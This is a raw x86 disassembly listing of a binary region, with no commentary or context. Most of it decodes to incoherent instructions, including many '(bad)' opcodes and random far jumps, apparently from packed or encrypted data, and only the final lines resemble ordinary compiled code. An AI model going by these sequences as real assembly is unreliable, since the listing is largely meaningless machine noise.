  414b2e:	shr    cl,cl
  414b30:	cdq    
  414b31:	jge    0x414b8b
  414b33:	mov    eax,0xe29dcb3c
  414b38:	icebp  
  414b39:	dec    esi
  414b3a:	in     eax,dx
  414b3b:	addr16 jnp 0x414b31
  414b3e:	(bad)  
  414b3f:	loop   0x414b6c
  414b41:	xchg   edi,eax
  414b42:	xor    eax,0x5840727d
  414b47:	popa   
  414b48:	push   edi
  414b49:	jmp    0x414b54
  414b4b:	inc    edi
  414b4c:	mov    esp,0xd8d3e22d
  414b51:	push   ebx
  414b52:	jb     0x414b56
  414b54:	and    BYTE PTR [edi+0x6e],al
  414b57:	mov    dh,0x36
  414b59:	lds    esi,FWORD PTR ds:0x83c28b0a
  414b5f:	pop    edx
  414b60:	and    al,0xc
  414b62:	test   BYTE PTR [esi],cl
  414b64:	sub    DWORD PTR [edi+edi*1+0x54],0xa6196160
  414b6c:	mov    bh,0xb5
  414b6e:	and    ecx,ebp
  414b70:	pop    esi
  414b71:	les    edi,FWORD PTR [ebx]
  414b73:	xor    eax,0xe26b94a3
  414b78:	add    ebx,esp
  414b7a:	push   ebx
  414b7b:	jp     0x414bdc
  414b7d:	push   ebx
  414b7e:	stos   DWORD PTR es:[edi],eax
  414b7f:	mov    eax,0x9b485b34
  414b84:	xchg   ebx,eax
  414b85:	dec    eax
  414b86:	push   ds
  414b87:	nop
  414b88:	cmp    DWORD PTR [esp+esi*8],ecx
  414b8b:	adc    BYTE PTR [esi+0x12],0x9b
  414b8f:	scas   al,BYTE PTR es:[edi]
  414b90:	and    DWORD PTR [ecx],ebp
  414b92:	jmp    0xa5f1:0x2cda1c99
  414b99:	xchg   edi,eax
  414b9a:	inc    ebx
  414b9b:	retf   0x97b
  414b9e:	xchg   esp,eax
  414b9f:	call   0xa79d:0x6ae5a68f
  414ba6:	loopne 0x414bed
  414ba8:	adc    al,0x7d
  414baa:	cmp    DWORD PTR [ecx+0x63b2f5f8],0xbabdbc2b
  414bb4:	iret   
  414bb5:	mov    edx,0xd50a0878
  414bba:	dec    eax
  414bbb:	out    dx,al
  414bbc:	fld    TBYTE PTR [ecx-0x27d90c30]
  414bc2:	xchg   ebx,eax
  414bc3:	call   DWORD PTR [esi+0x51]
  414bc6:	xchg   esp,eax
  414bc7:	mov    ebx,0x70257ec9
  414bcc:	push   ebx
  414bcd:	inc    edi
  414bce:	cli    
  414bcf:	rcr    DWORD PTR ds:0xe29d18ab,cl
  414bd5:	xchg   esp,eax
  414bd6:	sub    ebx,esi
  414bd8:	mov    esi,0x38c19539
  414bdd:	cmp    esp,0xf0802a5f
  414be3:	fs call 0x4693:0x42484f3
  414beb:	or     DWORD PTR [ecx+0x5e],0x3e
  414bef:	mov    eax,ds:0x274ef390
  414bf4:	imul   BYTE PTR [edi]
  414bf6:	js     0x414bda
  414bf8:	mov    ecx,0x8b0666fc
  414bfd:	pop    ebx
  414bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bff:	cmp    eax,0x7019f310
  414c04:	cld    
  414c05:	call   0x474e95b1
  414c0a:	xchg   esi,eax
  414c0b:	out    0xd8,al
  414c0d:	lods   al,BYTE PTR ds:[esi]
  414c0e:	mov    DWORD PTR [esi+edx*4],edi
  414c11:	sub    al,0xd8
  414c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c14:	jne    0x414c4b
  414c16:	sbb    edx,DWORD PTR [esi+0xfbf5ca6]
  414c1c:	add    al,0x1c
  414c1e:	call   0x36bf:0xed4a18f7
  414c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c26:	sbb    DWORD PTR [edx],ebx
  414c28:	xor    DWORD PTR [edx-0x2ffd7a19],0xbc297936
  414c32:	jno    0x414be4
  414c34:	jnp    0x414c78
  414c36:	adc    eax,0x5f32403e
  414c3b:	out    dx,al
  414c3c:	mov    DWORD PTR [eax+ebx*1-0x7d44437],ebx
  414c43:	(bad)  
  414c44:	fdiv   DWORD PTR [esi+0x3f34c74]
  414c4a:	xchg   ecx,eax
  414c4b:	mov    ds:0x372e6d49,al
  414c50:	lods   al,BYTE PTR ds:[esi]
  414c51:	and    DWORD PTR [esp+esi*1+0x67a585ac],ecx
  414c58:	or     edx,DWORD PTR ds:[esi+0x45]
  414c5c:	sbb    al,0xd7
  414c5e:	cmc    
  414c5f:	xchg   ecx,eax
  414c60:	imul   edx,DWORD PTR [ecx+edi*1+0xf2db8e5],0x59f10874
  414c6b:	mov    ebx,0x8eaf518e
  414c70:	jns    0x414ca8
  414c72:	xor    BYTE PTR [ecx+0x31],bl
  414c75:	adc    edi,ebp
  414c77:	std    
  414c78:	in     eax,0x7c
  414c7a:	les    esi,FWORD PTR [eax]
  414c7c:	mov    al,0x7c
  414c7e:	mov    ch,0xfb
  414c80:	add    DWORD PTR [esi+0x43],ebp
  414c83:	(bad)  
  414c84:	(bad)  
  414c85:	out    0xfc,al
  414c87:	xor    BYTE PTR [edi-0x687f72df],bh
  414c8d:	pop    ebx
  414c8e:	dec    ebp
  414c8f:	loopne 0x414c8a
  414c91:	add    al,0x95
  414c93:	push   esp
  414c94:	jnp    0x414c3a
  414c96:	mov    ebp,0x787ff871
  414c9b:	add    dh,BYTE PTR [ebp-0x20]
  414c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c9f:	icebp  
  414ca0:	pop    esp
  414ca1:	push   edx
  414ca2:	pushf  
  414ca3:	inc    ecx
  414ca4:	or     BYTE PTR [eax+0x493f9e07],0x87
  414cab:	push   ecx
  414cac:	mov    dl,0x49
  414cae:	mov    dh,0x41
  414cb0:	scas   eax,DWORD PTR es:[edi]
  414cb1:	test   eax,0x87f4c2dc
  414cb6:	jno    0x414c3c
  414cb8:	cmp    al,0x8f
  414cba:	add    DWORD PTR [edx],ecx
  414cbc:	push   cs
  414cbd:	gs jo  0x414cf0
  414cc0:	dec    ebx
  414cc1:	js     0x414c9b
  414cc3:	inc    ebp
  414cc4:	inc    esi
  414cc5:	arpl   WORD PTR [edi-0x71],di
  414cc8:	cdq    
  414cc9:	in     al,dx
  414cca:	fs inc edi
  414ccc:	and    esp,DWORD PTR ds:0xf53f7ac7
  414cd2:	inc    edi
  414cd3:	or     ebx,DWORD PTR [esi]
  414cd5:	test   BYTE PTR [ebp+0x5b123353],0x58
  414cdc:	jbe    0x414c82
  414cde:	adc    DWORD PTR [ebx+0x34caa134],ebx
  414ce4:	inc    ebp
  414ce5:	xchg   BYTE PTR [ecx+0x58031291],cl
  414ceb:	ds cld 
  414ced:	nop
  414cee:	add    DWORD PTR [eax],ebx
  414cf0:	add    DWORD PTR [ebx+esi*1-0x7631cc58],esi
  414cf7:	sub    BYTE PTR [ebp-0x54],bl
  414cfa:	mov    ebp,0x6ebe8f25
  414cff:	pusha  
  414d00:	add    DWORD PTR [edx-0x247f0ae],eax
  414d06:	adc    BYTE PTR [edx],ah
  414d08:	adc    al,0x4a
  414d0a:	cmp    DWORD PTR [ebx],ebx
  414d0c:	sbb    bh,bl
  414d0e:	pop    ebp
  414d0f:	es into 
  414d11:	jl     0x414d04
  414d13:	int3   
  414d14:	add    al,0xf3
  414d16:	jmp    0xe444:0x633870ba
  414d1d:	pop    eax
  414d1e:	test   DWORD PTR [ebx],eax
  414d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d21:	repz sub DWORD PTR [ecx+0x3f3fd955],edi
  414d28:	mov    ebp,0x21a4de28
  414d2d:	mov    ds:0x48766e97,eax
  414d32:	stos   BYTE PTR es:[edi],al
  414d33:	sub    al,0xc1
  414d35:	lahf   
  414d36:	jmp    0x414ced
  414d38:	fs ds pop edx
  414d3b:	aas    
  414d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d3d:	add    eax,0xaea7e8c1
  414d42:	inc    edx
  414d43:	lock jge 0x414d88
  414d46:	lods   al,BYTE PTR ds:[esi]
  414d47:	and    eax,0xdb29af9
  414d4c:	ret    
  414d4d:	jecxz  0x414dc6
  414d4f:	dec    eax
  414d50:	push   ss
  414d51:	jg     0x414d9e
  414d53:	out    0x76,eax
  414d55:	xchg   al,cl
  414d57:	hlt    
  414d58:	inc    esi
  414d59:	fs pop edi
  414d5b:	addr16 mov edx,0x52d8f049
  414d61:	mov    dl,0x52
  414d63:	sbb    eax,0x1ac220c6
  414d68:	mov    dh,0x5b
  414d6a:	loop   0x414d87
  414d6c:	or     ebp,DWORD PTR [eax]
  414d6e:	xchg   edi,eax
  414d6f:	xchg   DWORD PTR [esi-0x57d3d440],esp
  414d75:	jg     0x414db2
  414d77:	jns    0x414d06
  414d79:	pop    esp
  414d7a:	inc    esp
  414d7b:	fdiv   QWORD PTR [ebx+0x118431ab]
  414d81:	lods   eax,DWORD PTR ds:[esi]
  414d82:	add    DWORD PTR [esi-0x59],eax
  414d85:	jle    0x414d73
  414d87:	pop    eax
  414d88:	add    al,0x78
  414d8a:	sbb    ah,BYTE PTR [ecx+0x7ccf7b3b]
  414d90:	mov    fs:0xcf89418c,al
  414d96:	ins    BYTE PTR es:[edi],dx
  414d97:	outs   dx,BYTE PTR ds:[esi]
  414d98:	dec    ebx
  414d99:	pop    edi
  414d9a:	fidivr DWORD PTR [ebp+0x52]
  414d9d:	mov    ds:0x382daf4d,eax
  414da2:	dec    eax
  414da3:	dec    ebp
  414da4:	aam    0x5c
  414da6:	push   edi
  414da7:	or     DWORD PTR [edx+0x67],0xffffffbb
  414dab:	xlat   BYTE PTR ds:[ebx]
  414dac:	into   
  414dad:	pop    ds
  414dae:	pop    ds
  414daf:	inc    ecx
  414db0:	sub    DWORD PTR [esi],ebp
  414db2:	mov    ecx,0x69200237
  414db7:	in     eax,dx
  414db8:	push   edi
  414db9:	push   ss
  414dba:	or     eax,eax
  414dbc:	mov    WORD PTR [esi],cs
  414dbe:	inc    esi
  414dbf:	ja     0x414dab
  414dc1:	xlat   BYTE PTR ds:[ebx]
  414dc2:	dec    eax
  414dc3:	or     BYTE PTR [edi+0x79],0xcb
  414dc7:	mov    eax,ds:0xd9453013
  414dcc:	sbb    cl,BYTE PTR [edi]
  414dce:	loopne 0x414de7
  414dd0:	dec    ebp
  414dd1:	int    0x47
  414dd3:	dec    ecx
  414dd4:	cwde   
  414dd5:	enter  0xd2ff,0xac
  414dd9:	add    eax,0x67bb0e4d
  414dde:	icebp  
  414ddf:	std    
  414de0:	adc    esi,DWORD PTR [edi+eiz*2+0x76]
  414de4:	(bad)
  414de9:	xchg   edx,eax
  414dea:	lods   al,BYTE PTR ds:[esi]
  414deb:	mov    bl,0x10
  414ded:	arpl   WORD PTR [ebp-0x79],cx
  414df0:	enter  0xf103,0x1c
  414df4:	in     al,0x59
  414df6:	jnp    0x414e48
  414df8:	mov    DWORD PTR [edi-0x4df9302a],eax
  414dfe:	xchg   esp,eax
  414dff:	xor    DWORD PTR [esi+0xe2b1c30],ebp
  414e05:	fild   DWORD PTR [ebp-0x6558b81a]
  414e0b:	inc    esi
  414e0c:	and    al,0x4c
  414e0e:	ror    DWORD PTR [ecx+0x4f],cl
  414e11:	shl    DWORD PTR [eax-0x19504f10],0xa
  414e18:	xor    DWORD PTR [esi+edx*1+0x3f],edi
  414e1c:	lea    ecx,[ecx+edi*1-0x278a31ee]
  414e23:	push   ebp
  414e24:	mov    edx,0x5c8e479b
  414e29:	sahf   
  414e2a:	xchg   edx,eax
  414e2b:	add    dh,dl
  414e2d:	fnstenv [ecx+0x7d]
  414e30:	shl    DWORD PTR ds:0x41b324d0,1
  414e36:	into   
  414e37:	sbb    ecx,ecx
  414e39:	fstp   QWORD PTR [esp+eax*1]
  414e3c:	cmp    eax,0xd66a579d
  414e41:	out    dx,eax
  414e42:	repz mov ah,0x5c
  414e45:	push   esi
  414e46:	sbb    eax,0x887382bd
  414e4b:	xchg   ebx,eax
  414e4c:	sbb    esi,ecx
  414e4e:	fidivr WORD PTR ds:0xe7906794
  414e54:	xchg   edx,eax
  414e55:	adc    al,0x49
  414e57:	rcl    BYTE PTR [esi+0x5d],0x52
  414e5b:	push   ecx
  414e5c:	ins    BYTE PTR es:[edi],dx
  414e5d:	mov    dh,0xf
  414e5f:	mov    dl,bl
  414e61:	jns    0x414ecc
  414e63:	cwde   
  414e64:	push   eax
  414e65:	and    ebx,edi
  414e67:	out    dx,eax
  414e68:	fwait
  414e69:	or     esi,0x4e607138
  414e6f:	inc    esp
  414e70:	stc    
  414e71:	and    al,0xc9
  414e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e74:	out    0xc4,eax
  414e76:	out    dx,al
  414e77:	cmc    
  414e78:	mov    edi,0x8d54ce5a
  414e7d:	or     eax,0x22b0bc48
  414e82:	mov    eax,ds:0x448c171e
  414e87:	cmp    bl,BYTE PTR [ebx]
  414e89:	(bad)
  414e8d:	mov    eax,0x6edb1618
  414e92:	cdq    
  414e93:	mov    esp,cs
  414e95:	rol    eax,cl
  414e97:	pusha  
  414e98:	pop    ebx
  414e99:	add    DWORD PTR [ebx],0x94f402bb
  414e9f:	jno    0x414e3f
  414ea1:	imul   esp,ecx,0xffffffe1
  414ea4:	mov    cs,WORD PTR [eax+0x15]
  414ea7:	jae    0x414e4e
  414ea9:	xchg   BYTE PTR [edx+edi*8+0x4c3c30ed],cl
  414eb0:	jecxz  0x414e5c
  414eb2:	js     0x414e82
  414eb4:	jge    0x414e46
  414eb6:	in     eax,dx
  414eb7:	loopne 0x414ef1
  414eb9:	std    
  414eba:	cmp    al,0xe0
  414ebc:	jmp    0x6e7d:0xff309687
  414ec3:	lea    edx,[edx]
  414ec5:	(bad)  
  414ec6:	enter  0x9c02,0x2
  414eca:	and    ebx,0x55
  414ecd:	popa   
  414ece:	lock mov dl,0x9e
  414ed1:	das    
  414ed2:	aam    0x23
  414ed4:	aad    0x53
  414ed6:	mov    ds:0x93a9f09b,eax
  414edb:	outs   dx,DWORD PTR ds:[esi]
  414edc:	xor    DWORD PTR [eax+0x5a64c068],esi
  414ee2:	pop    esp
  414ee3:	pop    ecx
  414ee4:	sbb    bh,BYTE PTR [edi+0x27]
  414ee7:	and    ch,BYTE PTR [ebp-0x61]
  414eea:	sub    bh,bh
  414eec:	int3   
  414eed:	test   DWORD PTR [eax-0x35],edx
  414ef0:	fwait
  414ef1:	jno    0x414eb3
  414ef3:	mov    ch,0x1
  414ef5:	stos   DWORD PTR es:[edi],eax
  414ef6:	ins    DWORD PTR es:[edi],dx
  414ef7:	lds    edx,FWORD PTR [ecx+0x70a6b206]
  414efd:	daa    
  414efe:	out    dx,eax
  414eff:	mov    al,0xd8
  414f01:	or     al,0x86
  414f03:	mov    eax,edi
  414f05:	dec    edx
  414f06:	loopne 0x414ee5
  414f08:	pop    edx
  414f09:	retf   0x1a00
  414f0c:	enter  0xb73c,0xff
  414f10:	add    eax,0x2536445d
  414f15:	cmp    BYTE PTR [eax-0x1ad347b6],ch
  414f1b:	ja     0x414ed9
  414f1d:	add    bh,BYTE PTR [esp+ebx*4+0x6364f9c]
  414f24:	dec    ebx
  414f25:	jmp    DWORD PTR ds:0x829823c8
  414f2b:	aas    
  414f2c:	fisttp WORD PTR [edx]
  414f2e:	clc    
  414f2f:	imul   ecx,DWORD PTR [eax-0x2b1dc30],0xfffffff5
  414f36:	daa    
  414f37:	or     bl,cl
  414f39:	push   es
  414f3a:	push   ecx
  414f3b:	cmp    ch,al
  414f3d:	cmc    
  414f3e:	enter  0x8a42,0x71
  414f42:	jg     0x414f17
  414f44:	das    
  414f45:	imul   ebx,DWORD PTR [ecx-0x49],0x23
  414f49:	fdivr  QWORD PTR [ecx+0x4f]
  414f4c:	jp     0x414ee1
  414f4e:	xchg   ebx,eax
  414f4f:	jns    0x414fa4
  414f51:	xor    eax,0x1c23109a
  414f56:	xchg   ebp,eax
  414f57:	test   DWORD PTR [esi-0x9],esi
  414f5a:	xor    al,0x27
  414f5c:	daa    
  414f5d:	lea    ecx,[ebp+0x36]
  414f60:	fs inc ebp
  414f62:	retf   0xbf01
  414f65:	ins    DWORD PTR es:[edi],dx
  414f66:	nop
  414f67:	cmp    ah,BYTE PTR [esp+0x62]
  414f6b:	std    
  414f6c:	push   esi
  414f6d:	jecxz  0x414f8c
  414f6f:	dec    ebp
  414f70:	mov    eax,0xb3f61434
  414f75:	dec    eax
  414f76:	xor    bl,BYTE PTR [ebx+ebx*1]
  414f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f7a:	dec    ebx
  414f7b:	leave  
  414f7c:	popa   
  414f7d:	inc    ebp
  414f7e:	xor    edi,DWORD PTR ds:0x4bd3ad0
  414f84:	push   0xffffffd0
  414f86:	int3   
  414f87:	mov    al,0xf
  414f89:	mov    esi,0xf7814069
  414f8e:	stc    
  414f8f:	mov    cl,0x49
  414f91:	cmp    eax,0x46a3b004
  414f96:	mov    bh,0x51
  414f98:	and    cl,al
  414f9a:	sub    eax,0x58dad66
  414f9f:	js     0x414f69
  414fa1:	or     al,0xb6
  414fa3:	loope  0x414f2c
  414fa5:	test   DWORD PTR [esi-0x48],ecx
  414fa8:	lahf   
  414fa9:	or     DWORD PTR [ebp+0x19],esp
  414fac:	mov    ebp,DWORD PTR [ebx]
  414fae:	mov    ch,0xd4
  414fb0:	dec    edx
  414fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb2:	mov    dl,0x3a
  414fb4:	outs   dx,DWORD PTR ds:[esi]
  414fb5:	mov    edx,0x5c3d3e77
  414fba:	ss push ss
  414fbc:	leave  
  414fbd:	mov    ds:0x53d4b795,eax
  414fc2:	mov    ebp,0x5c9a6265
  414fc7:	data16 scas al,BYTE PTR es:[edi]
  414fc9:	popf   
  414fca:	movups xmm7,xmm3
  414fcd:	sbb    esi,edi
  414fcf:	pusha  
  414fd0:	shr    esi,cl
  414fd2:	jg     0x414f96
  414fd4:	cwde   
  414fd5:	sbb    al,0xbd
  414fd7:	out    0x23,al
  414fd9:	xor    al,BYTE PTR [edx-0x4f]
  414fdc:	dec    bl
  414fde:	xchg   ecx,eax
  414fdf:	sar    BYTE PTR [edi+0x1c],1
  414fe2:	sub    BYTE PTR [esi+0x75],0xa4
  414fe6:	popa   
  414fe7:	clc    
  414fe8:	test   ecx,ebx
  414fea:	pusha  
  414feb:	or     edi,esp
  414fed:	(bad)  
  414fee:	pop    ds
  414fef:	add    dh,BYTE PTR es:[esi]
  414ff2:	pop    edx
  414ff3:	sahf   
  414ff4:	jne    0x415002
  414ff6:	jecxz  0x41501b
  414ff8:	aad    0xdd
  414ffa:	rol    BYTE PTR [ebx+0x39],cl
  414ffd:	cs xor eax,0x4665f69a
  415003:	xchg   esi,eax
  415004:	cli    
  415005:	dec    eax
  415006:	(bad)  
  415007:	adc    al,0xca
  415009:	xor    al,0xc6
  41500b:	mov    ds:0xf54103c6,eax
  415010:	mov    esi,0xa70fc751
  415015:	inc    ebp
  415016:	mov    ds:0x3d51b31d,al
  41501b:	cld    
  41501c:	in     eax,0xa5
  41501e:	int3   
  41501f:	or     eax,0x452ebf4d
  415024:	in     al,0xbc
  415026:	dec    eax
  415027:	fst    DWORD PTR [esi+0x23946d4f]
  41502d:	lods   eax,DWORD PTR ds:[esi]
  41502e:	mov    cl,bh
  415030:	xor    eax,0x381742bb
  415035:	(bad)  
  415036:	mov    dh,0xc8
  415038:	ins    DWORD PTR es:[edi],dx
  415039:	aas    
  41503a:	jle    0x415096
  41503c:	(bad)  
  41503d:	push   esp
  41503e:	mov    ds:0xc931072c,eax
  415043:	stos   DWORD PTR es:[edi],eax
  415044:	retf   
  415045:	cmp    DWORD PTR [edx-0x52fcf4e9],0x58810649
  41504f:	push   esp
  415050:	push   0x73
  415052:	mov    cl,0xfd
  415054:	mov    bl,BYTE PTR [eax]
  415056:	pop    ebp
  415057:	jle    0x415015
  415059:	or     al,0x4c
  41505b:	jne    0x415084
  41505d:	jecxz  0x415071
  41505f:	aaa    
  415060:	(bad)
  415063:	popa   
  415064:	pop    es
  415065:	xor    BYTE PTR [edi+0xe1dffad],al
  41506b:	and    al,al
  41506d:	cmp    ebp,esi
  41506f:	sbb    eax,0x8f445e07
  415074:	(bad)  
  415075:	and    ebx,eax
  415077:	jne    0x41508c
  415079:	jo     0x415053
  41507b:	mov    dl,0x1f
  41507d:	sub    bl,BYTE PTR [ecx-0x5bb5397e]
  415083:	sbb    BYTE PTR [ebp-0x7f9d692e],dl
  415089:	stc    
  41508a:	or     edx,ebx
  41508c:	jno    0x415085
  41508e:	aam    0xb1
  415090:	or     bl,ch
  415092:	popf   
  415093:	call   0xa64091ac
  415098:	sub    BYTE PTR [ebp-0x32],ch
  41509b:	pop    ecx
  41509c:	push   esp
  41509d:	gs in  al,dx
  41509f:	mov    ch,0x5f
  4150a1:	xor    al,0x97
  4150a3:	sbb    dl,BYTE PTR [edx+eax*1]
  4150a6:	clc    
  4150a7:	jmp    0xb27b745e
  4150ac:	sub    eax,0xd31dfaf4
  4150b1:	rcr    BYTE PTR gs:[ecx-0x22],1
  4150b5:	cwde   
  4150b6:	cld    
  4150b7:	addr16 inc ebp
  4150b9:	inc    ebp
  4150ba:	leave  
  4150bb:	in     eax,0x58
  4150bd:	mov    dl,0xab
  4150bf:	sahf   
  4150c0:	inc    ecx
  4150c1:	sub    esp,DWORD PTR [edi-0x5e]
  4150c4:	enter  0x63e4,0xa0
  4150c8:	minps  xmm6,XMMWORD PTR [edi+0x2f9df3ff]
  4150cf:	mov    eax,ds:0x3ccf63d4
  4150d4:	push   es
  4150d5:	data16 fmulp st(7),st
  4150d8:	(bad)  
  4150da:	mov    bh,0x1c
  4150dc:	add    dl,ah
  4150de:	add    eax,0x589d8f15
  4150e3:	(bad)  
  4150e4:	mov    eax,0xfbb1632d
  4150e9:	stc    
  4150ea:	add    ah,BYTE PTR [esi+0x776f278c]
  4150f0:	mov    bh,0x20
  4150f2:	out    dx,eax
  4150f3:	(bad)  
  4150f4:	jnp    0x415150
  4150f6:	fst    QWORD PTR [ebp+edx*1-0x246a8f59]
  4150fd:	(bad)  
  4150fe:	jle    0x41513c
  415100:	cmc    
  415101:	mov    ?,WORD PTR [edi+ecx*1]
  415104:	pop    es
  415105:	outs   dx,BYTE PTR ds:[esi]
  415106:	push   edx
  415107:	out    dx,eax
  415108:	(bad)  
  415109:	pop    ebx
  41510a:	std    
  41510b:	and    al,0xf5
  41510d:	mov    ebx,0x2781f2c
  415112:	dec    esi
  415113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415114:	clc    
  415115:	neg    BYTE PTR [esi]
  415117:	sar    BYTE PTR [ebp+edi*8-0x70d60fc6],1
  41511e:	xchg   esi,eax
  41511f:	into   
  415120:	push   edi
  415121:	cwde   
  415122:	sub    cl,ah
  415124:	nop
  415125:	mov    bl,0x17
  415127:	sub    bl,BYTE PTR [ebp+0x5e]
  41512a:	fistp  DWORD PTR [esi-0x2c]
  41512d:	inc    ebp
  41512e:	pop    eax
  41512f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415130:	mov    BYTE PTR [ebx],cl
  415132:	add    ecx,DWORD PTR [eax+0x1572ab2]
  415138:	pop    eax
  415139:	mov    edx,0xd8f84fb
  41513e:	out    dx,eax
  41513f:	and    esi,DWORD PTR [ecx-0x7eda9915]
  415145:	jae    0x41512a
  415147:	push   0xfffffff9
  415149:	out    dx,al
  41514a:	bound  esp,QWORD PTR [ecx-0x66722055]
  415150:	scas   al,BYTE PTR es:[edi]
  415151:	ret    0xb11e
  415154:	add    eax,0xe75d88a
  415159:	fbld   TBYTE PTR [ebx-0x16767684]
  41515f:	repz test BYTE PTR [ebp+0x21],ch
  415163:	xchg   esp,eax
  415164:	out    0xe1,eax
  415166:	xor    bl,bl
  415168:	test   BYTE PTR [ebx+eiz*2-0x45],bl
  41516c:	jno    0x41514f
  41516e:	mov    bl,0x76
  415170:	scas   al,BYTE PTR es:[edi]
  415171:	mov    DWORD PTR [ebp+0x3c],edx
  415174:	xor    al,BYTE PTR [eax]
  415176:	fscale 
  415178:	jns    0x4151a8
  41517a:	nop
  41517b:	or     al,0x31
  41517d:	xor    esp,DWORD PTR [edi-0x33]
  415180:	popa   
  415181:	mov    esp,0x6f7ab2e2
  415186:	dec    edx
  415187:	cld    
  415188:	jb     0x4151cd
  41518a:	stc    
  41518b:	test   al,0x8f
  41518d:	les    ebx,FWORD PTR [esi]
  41518f:	push   esi
  415190:	and    BYTE PTR [edx+0x74641c41],bl
  415196:	push   edx
  415197:	rcr    DWORD PTR [eax+0x7d4b90ae],cl
  41519d:	rcr    BYTE PTR [ecx+0x76fb1915],1
  4151a3:	add    ah,BYTE PTR [edi]
  4151a5:	push   ebp
  4151a6:	xchg   esi,eax
  4151a7:	not    BYTE PTR ds:0x4184540e
  4151ad:	or     ecx,DWORD PTR [edx-0x7961ea20]
  4151b3:	rcr    al,1
  4151b5:	ss push edi
  4151b7:	dec    ebp
  4151b8:	pop    edx
  4151b9:	xor    al,0x72
  4151bb:	inc    edx
  4151bc:	test   BYTE PTR [esi+0x26],0x4b
  4151c0:	cdq    
  4151c1:	mov    bl,0x8b
  4151c3:	jmp    0x415183
  4151c5:	sbb    DWORD PTR [edx+0x3d],edi
  4151c8:	and    eax,0xabf513f4
  4151cd:	dec    esi
  4151ce:	push   esi
  4151cf:	xor    BYTE PTR [esp+ebp*4],bh
  4151d2:	fdiv   DWORD PTR [edx+0x47]
  4151d5:	in     eax,dx
  4151d6:	out    0xb2,al
  4151d8:	je     0x4151fc
  4151da:	xlat   BYTE PTR ds:[ebx]
  4151db:	xchg   esp,eax
  4151dc:	je     0x4151e1
  4151de:	xlat   BYTE PTR ds:[ebx]
  4151df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e0:	popa   
  4151e1:	test   BYTE PTR ds:0xaefb0b88,0xb6
  4151e8:	jb     0x415209
  4151ea:	fidivr WORD PTR [edx]
  4151ec:	cmc    
  4151ed:	sub    edx,DWORD PTR [eax+0x59]
  4151f0:	push   eax
  4151f1:	lea    esi,[edx]
  4151f3:	cmp    BYTE PTR [ebp+0xe690474],bh
  4151f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fa:	das    
  4151fb:	int3   
  4151fc:	jecxz  0x415258
  4151fe:	les    ebx,FWORD PTR [ebp-0x35512fea]
  415204:	bnd ja 0x4151d7
  415207:	mov    ch,0x54
  415209:	cmp    edx,DWORD PTR [ecx]
  41520b:	cmp    eax,0xfc4f6d3d
  415210:	mov    eax,0x498cc9a7
  415215:	mov    ecx,0xb5ba4d56
  41521a:	outs   dx,DWORD PTR ds:[esi]
  41521b:	dec    edx
  41521c:	ins    BYTE PTR es:[edi],dx
  41521d:	out    dx,eax
  41521e:	leave  
  41521f:	push   esi
  415220:	fidivr WORD PTR [ebx]
  415222:	dec    ebx
  415223:	add    al,0xc9
  415225:	xor    eax,0x3ae3c12b
  41522a:	jo     0x4151f2
  41522c:	loopne 0x4151bd
  41522e:	mov    ds,WORD PTR es:[edx-0x14126aa3]
  415235:	fidivr WORD PTR [ebp+0x608628bc]
  41523b:	loope  0x415278
  41523d:	lods   eax,DWORD PTR ds:[esi]
  41523e:	add    BYTE PTR [ebx],0xf0
  415241:	cmp    eax,0x86255875
  415246:	shr    DWORD PTR ds:0xe054ec91,0xaf
  41524d:	mov    ds,WORD PTR [ebx-0x687136f8]
  415253:	jmp    0xd462:0x3b86505a
  41525a:	shl    BYTE PTR [eax],1
  41525c:	xchg   BYTE PTR ds:0x48a940ed,bl
  415262:	in     al,dx
  415263:	sahf   
  415264:	lock std 
  415266:	jns    0x41523d
  415268:	push   ecx
  415269:	lock push 0x69609a65
  41526f:	jno    0x415256
  415271:	xor    eax,0x4bfe5601
  415276:	sbb    al,0x45
  415278:	ret    
  415279:	iret   
  41527a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41527b:	mov    ch,0x89
  41527d:	dec    ebx
  41527e:	repnz mov al,ds:0xe46cfb16
  415284:	jge    0x41521b
  415286:	mov    eax,ds:0x2e866fd7
  41528b:	pop    esp
  41528c:	push   es
  41528d:	jg     0x41522a
  41528f:	hlt    
  415290:	jbe    0x4152f6
  415292:	push   cs
  415293:	add    eax,0xeeac8a82
  415298:	(bad)  [eax]
  41529a:	push   esi
  41529b:	test   al,0x8
  41529d:	sub    ch,BYTE PTR [edi+0x4]
  4152a0:	(bad)  [edi-0x7f7b9ed6]
  4152a6:	cdq    
  4152a7:	outs   dx,DWORD PTR ds:[esi]
  4152a8:	pop    eax
  4152a9:	(bad)  
  4152aa:	ds xor eax,0xe5c83463
  4152b0:	jns    0x4152d8
  4152b2:	and    DWORD PTR [eax+edx*8+0x2b6cfac6],esi
  4152b9:	cwde   
  4152ba:	pop    esi
  4152bb:	or     al,0x44
  4152bd:	mov    dh,0x37
  4152bf:	add    BYTE PTR [eax+0x70],bl
  4152c2:	jecxz  0x415322
  4152c4:	retf   0x18f8
  4152c7:	lock (bad) 
  4152c9:	nop
  4152ca:	fisttp WORD PTR [esi+0x68]
  4152cd:	mov    bl,0x40
  4152cf:	jl     0x41531e
  4152d1:	xchg   ebp,eax
  4152d2:	mov    eax,ds:0xff2320e7
  4152d7:	adc    eax,0x417014
  4152dc:	mov    DWORD PTR [ebp-0x2c],eax
  4152df:	movzx  eax,WORD PTR [ebp-0x2c]
  4152e3:	cmp    eax,0x539
  4152e8:	jne    0x415319
  4152ea:	mov    DWORD PTR [ebp-0x14],0xe0d
  4152f1:	lea    ecx,[ebp-0x28]
  4152f4:	push   ecx
  4152f5:	call   DWORD PTR ds:0x417018
  4152fb:	mov    DWORD PTR [ebp-0x60],eax
  4152fe:	mov    DWORD PTR [ebp-0x54],0x3a
